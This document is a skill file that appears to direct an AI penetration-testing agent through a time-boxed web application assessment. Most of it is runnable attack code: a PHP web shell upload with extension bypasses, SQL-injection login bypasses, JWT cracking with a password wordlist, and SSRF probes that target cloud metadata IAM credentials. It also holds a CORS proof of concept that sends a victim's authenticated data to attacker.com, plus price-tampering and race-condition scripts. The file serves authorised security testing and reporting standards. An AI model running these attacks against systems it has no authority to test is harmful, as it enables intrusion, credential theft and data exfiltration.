---
name: quick
description: Time-boxed rapid assessment targeting maximum-ROI vulnerability classes — mandatory UI exploration, think-tool-before-every-decision, real exploitation required, mandatory raw HTTP evidence, CORS restricted to sensitive endpoints only, and identical reporting standards to Standard/Deep mode
---

# Quick Testing Mode — Fast, Focused, Uncompromised Standards

Quick mode is NOT a lower-quality mode. It is a different SCOPE with identical STANDARDS. The testing is prioritized and time-boxed. The evidence requirements are identical to Standard and Deep mode. The reporting quality is identical. The validation bar is identical.

Speed comes from smart targeting — not from lowering evidence requirements.

---

## QUICK MODE SUPREME RULES — IDENTICAL TO ALL OTHER MODES

RULE 1: THINK TOOL MANDATORY — use before reporting any vulnerability, before calling agent_finish.

RULE 2: RAW HTTP MANDATORY — every report MUST include COMPLETE raw HTTP request AND response.

RULE 3: REAL EXPLOITATION ONLY — no theoretical findings, no scanner-only findings.

RULE 4: BROWSER EXECUTION REQUIRED FOR XSS — reflection without execution = NOT XSS.

RULE 5: IDOR REQUIRES ACTUAL DATA — "200 OK from User B" is NOT IDOR.

RULE 6: CORS ON SENSITIVE ENDPOINTS ONLY — NEVER test CORS on public endpoints.

RULE 7: SSRF DNS-ONLY = LOW/INFO — not High, not Critical.

RULE 8: MISSING HEADERS = INFORMATIONAL — never Critical or High alone.

RULE 9: RATE LIMIT = HIGH ONLY IF no lockout + brute force demonstrated with 500+ requests.

RULE 10: EVERY REPORT NEEDS ALL 11 SECTIONS — quick mode does not reduce report requirements.

RULE 11: VERIFY RESPONSE ORIGIN — before treating any response as evidence, confirm it actually came from the host/subdomain you intended to test. Multi-host targets (e.g. `api.example.com` vs `example.com`) can silently misroute, and a proxy/CDN can serve a stale cached response; check that the actual request URL + `Host` header match the intended target before drawing any conclusion.

---

## Priority Order — Test in THIS EXACT ORDER

In quick mode, test in strict priority order. Move to next priority after each is fully tested.

**P1: Broken Access Control (IDOR + Privilege Escalation)** — highest ROI
**P2: Authentication Bypass (SQLi in login, JWT attacks, OAuth)**
**P3: Remote Code Execution (file upload, SSTI, command injection, deserialization)**
**P4: SQL Injection (all parameters)**
**P5: SSRF (all URL-accepting parameters)**
**P6: XSS (stored first, then reflected)**
**P7: CORS (sensitive authenticated endpoints ONLY)**
**P8: Business Logic (payment manipulation, race conditions)**

---

## Phase 0: Rapid Orientation

### Black-Box (no source):
```bash
# Fetch documentation immediately — reveals attack surfaces fast
for path in /robots.txt /swagger.json /openapi.json /api-docs /graphql; do
  r=$(curl -so /tmp/resp -w "%{http_code}" "https://target.com${path}")
  [[ "$r" != "404" ]] && echo "FOUND: ${path} (${r})" && cat /tmp/resp | head -50
done

# Quick tech detection
httpx -u https://target.com -title -tech-detect -status-code

# Quick endpoint scan from JS
curl -s https://target.com | grep -oE "src=['\"][^'\"]+\.js['\"]" | sort -u
# Download main JS bundle, extract endpoints
MAIN_JS=$(curl -s https://target.com | grep -oE "src=['\"][^'\"]+main[^'\"]+\.js" | head -1)
curl -s "https://target.com/${MAIN_JS}" | js-beautify - | \
  grep -oE "['\"`](/api/[a-zA-Z0-9_/-]{3,})['\"`]" | sort -u

# WAF check
wafw00f https://target.com 2>/dev/null | grep "WAF"
```

### White-Box (source available):
```bash
# Find highest-risk code patterns
grep -rn "eval\|exec\|system\|shell_exec\|subprocess\|os\.system" src/ --include="*.py" --include="*.php" --include="*.js" -l
grep -rn "innerHTML\|document\.write\|dangerouslySetInnerHTML\|v-html" src/ -l
grep -rn "raw_query\|execute\|whereRaw\|format\(.*SELECT" src/ -l
grep -rn "render_template_string\|jinja2\.Template\|eval\(" src/ --include="*.py" -l

# Check recent changes to auth/payments/access control
git log --oneline -50 --diff-filter=M -- "*auth*" "*payment*" "*permission*" "*role*"
git diff HEAD~10 -- "*.py" "*.js" "*.php" | grep "^+" | head -100

# Dependency vulnerabilities
trivy fs . --severity HIGH,CRITICAL --format json 2>/dev/null | head -100
```

### Quick Browser Walkthrough (10-15 minutes — MANDATORY)
```
1. Navigate to home page → identify main features
2. Click main navigation items
3. Log in (create account if needed) → identify authenticated features
4. Note ALL URL patterns and object IDs visible
5. Identify the most sensitive features: messages, payments, profile, admin
6. Create /workspace/endpoint_checklist.md with all discovered endpoints
```

---

## Phase 1: Rapid UI Walkthrough (MANDATORY EVEN IN QUICK MODE)

```
1. Navigate to home page as unauthenticated user
2. Click every visible navigation element
3. Register User A account via UI
4. Register User B account via UI
5. Log in as User A
6. Click main navigation items in authenticated view
7. Identify: messaging feature, payment feature, profile/settings, file upload, API keys
8. Create one resource of each type as User A — record all IDs
9. Capture all network requests via proxy
```

---

## Phase 2: P1 — Broken Access Control (IDOR + Privilege Escalation)

### Rapid IDOR Scan
```python
import requests

# Load User A's session and resource IDs
USER_A_RESOURCES = load_user_a_resources()
USER_B_COOKIE = load_auth("user_b")["cookie"]
USER_A_UNIQUE_DATA = {
    "email": "user_a@test.com",
    "username": "user_a_test",
    # Add other unique identifiers from User A's profile
}

def quick_idor_scan(resource_url, resource_id):
    """
    Quick IDOR: access User A's resource with User B's session.
    CRITICAL: Must verify response BODY contains User A's actual data.
    200 OK alone = NOT IDOR.
    """
    r = requests.get(f"{resource_url}/{resource_id}",
        headers={"Cookie": f"session={USER_B_COOKIE}"})
    
    print(f"Testing: {resource_url}/{resource_id} | Status: {r.status_code}")
    
    if r.status_code == 200:
        body = r.text
        for field, value in USER_A_UNIQUE_DATA.items():
            if str(value) in body:
                print(f"✅ IDOR CONFIRMED: User B sees User A's {field}='{value}'")
                # Capture raw HTTP evidence
                print(f"\n[RAW REQUEST]: GET {resource_url}/{resource_id}")
                print(f"[VULNERABLE COOKIE]: {USER_B_COOKIE[:20]}... ← USER B SESSION")
                print(f"[RAW RESPONSE]: HTTP {r.status_code}")
                for h, v in list(r.headers.items())[:5]:
                    print(f"  {h}: {v}")
                print(f"[BODY]: {body[:500]}")
                print(f"[PROOF]: Contains User A's {field}='{value}' ← IDOR EVIDENCE")
                return True, field, value, body
        
        print(f"NOT IDOR: 200 OK but User A's data not in response")
        print(f"Body preview: {body[:100]}")
    else:
        print(f"Blocked: {r.status_code}")
    return False, None, None, None

# Run for all User A resources and all HTTP methods
for rid, rurl in USER_A_RESOURCES.items():
    for method in ["GET", "PUT", "PATCH", "DELETE"]:
        try:
            r = requests.request(method, f"{rurl}/{rid}",
                headers={"Cookie": f"session={USER_B_COOKIE}",
                         "Content-Type": "application/json"},
                json={"field": "modified_by_user_b"})
            if r.status_code in [200, 204]:
                print(f"⚠️ {method} {rurl}/{rid}: {r.status_code} — verify if User B modified User A's resource")
        except Exception: pass
```

### Vertical Privilege Escalation
```python
# Test every admin endpoint with User A (regular user)
admin_endpoints = [
    "/admin", "/admin/users", "/api/admin/users", "/api/admin/settings",
    "/api/admin/roles", "/api/admin/logs", "/api/admin/reports",
    "/api/admin/impersonate", "/api/users/all", "/api/internal"
]

for endpoint in admin_endpoints:
    r = requests.get(f"https://target.com{endpoint}",
        headers={"Cookie": USER_A_COOKIE})
    if r.status_code == 200:
        print(f"⚠️ POTENTIAL BFLA: {endpoint} accessible by regular user")
        print(f"Response: {r.text[:200]}")

# Role parameter manipulation
r = requests.patch("https://target.com/api/user/profile",
    json={"username": "user_a", "role": "admin", "isAdmin": True},
    headers={"Cookie": USER_A_COOKIE})
if r.status_code == 200 and "admin" in r.text.lower():
    print("⚠️ MASS ASSIGNMENT: role/isAdmin accepted in update")
```

---

## Phase 3: P2 — Authentication Bypass

```python
# SQL injection in login
for payload in ["' OR '1'='1'--", "admin'--", '" OR "1"="1"--']:
    r = requests.post("https://target.com/api/auth/login",
        json={"email": payload, "password": "anything"})
    if r.status_code == 200 and ("token" in r.text or "session" in r.text):
        print(f"✅ LOGIN BYPASS via SQLi: {payload}")
        print(f"Raw HTTP Response:\nHTTP/1.1 {r.status_code} OK\n{r.text[:500]}")
```

```bash
# JWT attacks
jwt_tool ${USER_TOKEN} -X a          # none algorithm
jwt_tool ${USER_TOKEN} -C -d /usr/share/wordlists/rockyou.txt  # weak secret

# Test password reset host header injection
curl -s -X POST "https://target.com/api/auth/forgot-password" \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"user@target.com"}' \
  -v 2>&1 | head -30
# Check if sent email contains attacker.com in reset link
```

---

## Phase 4: P3 — Remote Code Execution

```python
# File upload — web shell attempt
def quick_rce_file_upload(upload_url, session_cookie):
    shell_variants = [
        ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.php5", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.PHP", b"<?php system($_GET['cmd']); ?>", "image/gif"),
        (".htaccess", b"AddType application/x-httpd-php .jpg\n", "text/plain"),
    ]
    
    for filename, content, mime in shell_variants:
        r = requests.post(upload_url,
            files={"file": (filename, content, mime)},
            headers={"Cookie": session_cookie})
        print(f"Upload {filename}: {r.status_code}")
        
        if r.status_code in [200, 201]:
            file_url = extract_url_from_response(r)
            if file_url:
                exec_r = requests.get(f"{file_url}?cmd=id")
                if "uid=" in exec_r.text:
                    print(f"✅ RCE CONFIRMED: {file_url}?cmd=id → {exec_r.text[:100]}")
                    return True, file_url

# SSTI
ssti_payloads = {
    "jinja2": "{{7*7}}",
    "twig": "{{7*7}}",
    "freemarker": "${7*7}",
    "velocity": "#set($x=7*7)$x",
    "smarty": "{php}echo 7*7;{/php}",
    "jade": "#{7*7}",
}

for engine, payload in ssti_payloads.items():
    r = requests.get(f"https://target.com/api/render",
        params={"template": payload},
        headers={"Cookie": USER_A_COOKIE})
    if "49" in r.text:
        print(f"✅ SSTI CONFIRMED ({engine}): {payload} → 49 in response")
        # Escalate to RCE
```

---

## Phase 5: P4 — SQL Injection

```bash
# Quick automated scan
sqlmap -l /workspace/proxy_requests.txt \
  --batch --level=3 --risk=2 \
  --technique=BEUST \
  --dbms=mysql,postgresql,mssql \
  --output-dir=/workspace/sqlmap_quick/

# Focus on: search, filter, sort, ID parameters, login form
```

```python
# Time-based confirmation — 5x required even in quick mode
def confirm_sqli_5x(url, param, payload, baseline):
    import time, statistics
    baselines = []; injected_times = []
    for _ in range(5):
        t = time.time(); requests.get(url, params={param: baseline})
        baselines.append(time.time() - t)
        t = time.time(); requests.get(url, params={param: payload})
        injected_times.append(time.time() - t)
    
    b_avg = statistics.mean(baselines)
    i_avg = statistics.mean(injected_times)
    print(f"Baseline: {b_avg:.2f}s | Injected: {i_avg:.2f}s | Diff: {i_avg-b_avg:.2f}s")
    
    if i_avg > b_avg + 4.5:
        print("✅ SQLI CONFIRMED (5x timing)")
        return True
    return False
```

---

## Phase 6: P5 — SSRF

```python
# Quick SSRF test — all URL parameters
url_params = extract_url_params_from_proxy()

for endpoint, param in url_params:
    # DNS OOB first — confirms injection point (but = Low/Info ONLY)
    oast = f"http://{interactsh_id}.oast.fun/quick-{param}"
    r = requests.post(endpoint, json={param: oast},
        headers={"Cookie": USER_A_COOKIE})
    
    # Immediately escalate to cloud metadata
    for meta_url in [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ]:
        r = requests.post(endpoint, json={param: meta_url},
            headers={"Cookie": USER_A_COOKIE,
                     "Metadata-Flavor": "Google"})
        if r.status_code == 200 and len(r.text) > 20:
            print(f"✅ SSRF HIGH: Cloud metadata via {param}: {r.text[:200]}")
            break

# SSRF SEVERITY REMINDER:
# DNS callback only → Low/Informational (NEVER Critical/High)
# Internal service response → Medium
# Cloud IAM credentials → High/Critical
```

---

## Phase 7: P6 — XSS (Stored First)

```python
from playwright.sync_api import sync_playwright

def test_stored_xss_quick(input_field_url, input_field_name, display_url):
    """
    Quick stored XSS test.
    MANDATORY: Confirm execution in headless browser.
    """
    payload = f'<img src=x onerror=alert(document.domain)>'
    
    # Submit XSS payload
    r = requests.post(input_field_url,
        json={input_field_name: payload},
        headers={"Cookie": USER_A_COOKIE})
    
    if r.status_code not in [200, 201]:
        return False
    
    # Confirm execution in browser
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        executed = {"value": False, "msg": ""}
        
        page.on("dialog", lambda d: (
            executed.__setitem__("value", True),
            executed.__setitem__("msg", d.message),
            d.accept()
        ))
        
        page.goto(display_url, timeout=10000)
        page.wait_for_timeout(3000)
        browser.close()
        
        if executed["value"]:
            print(f"✅ STORED XSS CONFIRMED: alert({executed['msg']}) executed at {display_url}")
            return True
        else:
            print(f"❌ Payload submitted but did NOT execute in browser — not confirmed")
            return False
```

---

## Phase 8: P7 — CORS (Sensitive Endpoints ONLY)

```python
# STEP 1: Quick sensitive endpoint detection — MANDATORY before any CORS test
def quick_cors_check(authenticated_endpoints, user_cookie):
    sensitive_kw = ["email", "phone", "token", "key", "payment", "message", "private", "ssn"]
    
    for ep in authenticated_endpoints:
        r = requests.get(ep, headers={"Cookie": user_cookie})
        if not any(kw in r.text.lower() for kw in sensitive_kw):
            continue  # SKIP — not sensitive
        
        # STEP 2: Test CORS only on confirmed sensitive endpoint
        r2 = requests.get(ep, headers={
            "Cookie": user_cookie,
            "Origin": "https://attacker.com"
        })
        acao = r2.headers.get("Access-Control-Allow-Origin", "")
        acac = r2.headers.get("Access-Control-Allow-Credentials", "")
        
        if "attacker.com" in acao and acac.lower() == "true":
            print(f"✅ EXPLOITABLE CORS (sensitive endpoint): {ep}")
            poc = f'<script>fetch("{ep}",{{credentials:"include"}}).then(r=>r.text()).then(d=>fetch("https://attacker.com/?x="+btoa(d)))</script>'
            print(f"PoC: {poc}")
```

---

## Phase 9: P8 — Business Logic Quick Tests

```python
# Race condition on highest-value endpoint
async def quick_race_test(url, payload, n=15):
    import asyncio, aiohttp
    async with aiohttp.ClientSession() as s:
        results = await asyncio.gather(*[
            s.post(url, json=payload, headers={"Cookie": USER_A_COOKIE})
            for _ in range(n)
        ])
    from collections import Counter
    counts = Counter(r.status for r in results)
    print(f"Race test ({n} simultaneous): {dict(counts)}")
    if counts.get(200, 0) > 1:
        print("⚠️ Potential race condition — check if action processed multiple times")

# Price manipulation
r = requests.post("https://target.com/api/cart/checkout",
    json={"items": [{"id": "ITEM_1", "price": -99.99, "qty": 1}]},
    headers={"Cookie": USER_A_COOKIE})
if r.status_code == 200:
    print("⚠️ CLIENT-SIDE PRICE ACCEPTED: Price manipulated to -99.99")
```

---

## Quick Mode False Positive Checklist — REVIEW BEFORE EVERY REPORT

USING THE THINK TOOL, verify every finding against this checklist:

```
FALSE POSITIVE REJECTIONS (reject immediately if ANY apply):
[ ] IDOR: Does User B's response body contain User A's actual private data? If NO → NOT IDOR
[ ] XSS: Did the payload execute in the headless browser? If NO → NOT XSS
[ ] CORS: Is the endpoint authenticated and does it return sensitive data? If NO → NOT CORS
[ ] SSRF: Is the finding more than a DNS callback? If NO → Low/Info ONLY
[ ] Rate limit: Is there also NO account lockout AND 500+ requests processed? If NO → Low ONLY
[ ] Missing headers: Are these the ONLY finding? If YES → Informational ONLY
[ ] Self-XSS: Is the attacker the only one who can trigger it? If YES → Informational ONLY
[ ] Open redirect: Does it enable token theft or phishing chain? If NO → Low/Info ONLY
[ ] Username enumeration: Is there NO account lockout? If lockout exists → Low ONLY

MANDATORY BEFORE REPORTING:
[ ] Two independent confirmation signals identified (both listed)
[ ] Real exploitation proven with tangible output (exact output quoted)
[ ] Complete raw HTTP request captured (all headers + body)
[ ] Complete raw HTTP response captured (status + headers + body)
[ ] UI reproduction steps documented (every click and input)
[ ] Business impact stated specifically: "An attacker can [ACTION] which results in [CONSEQUENCE] affecting [USERS]"
[ ] Think tool used to answer all 5 Real Impact Gate questions
```

---

## Quick Mode Reporting — ALL 11 SECTIONS STILL REQUIRED

Quick mode does NOT reduce the number of required report sections.
Quick mode does NOT reduce the raw HTTP evidence requirement.
Quick mode does NOT reduce the proof of exploitation requirement.

The ONLY difference from Standard/Deep mode is the scope of what is tested.
The QUALITY of what is reported is identical.

```
Every report via create_vulnerability_report MUST include in technical_analysis:

COMPLETE RAW HTTP REQUEST:
[METHOD] [PATH] HTTP/1.1
Host: [target]
Authorization/Cookie: [token — ← ATTACKER'S SESSION or ← ATTACK PAYLOAD]
Content-Type: [type]
[all other headers]

[complete body — ← VULNERABLE PARAMETER marked]

COMPLETE RAW HTTP RESPONSE:
HTTP/1.1 [status]
[all headers]

[complete body — ← PROOF OF EXPLOITATION marked]
```

---

## What to Skip in Quick Mode (ONLY These)

The following are NOT tested in quick mode — save for Standard/Deep:
- Exhaustive subdomain enumeration and full port scanning
- Deep directory brute-forcing (use small wordlists only)
- HTTP request smuggling
- DOM clobbering and mutation XSS
- Web cache poisoning
- Prototype pollution
- Detailed WebSocket security testing beyond basic auth check
- GraphQL depth/batching DoS attacks
- Comprehensive rate limiting on non-auth endpoints
- Low-severity information disclosure without a concrete exploit path
- SAML attacks unless SAML is detected
- gRPC security testing unless gRPC is detected

---

## Quick Mode Mindset

You have limited time. Focus on the highest-impact findings first. Work down the priority list. Never lower the evidence bar — lower the scope instead.

One confirmed Critical with perfect evidence is worth more than a report full of theoretical Mediums.

If Priority 1 (access control) yields a Critical in the first 30 minutes: document it completely and keep going. Don't stop. Move to Priority 2 and keep hunting. The goal is maximum verified impact in minimum time.

When you have findings: the reporting must be as complete as in Deep mode. The investigation depth may be more focused, but the evidence package is identical.
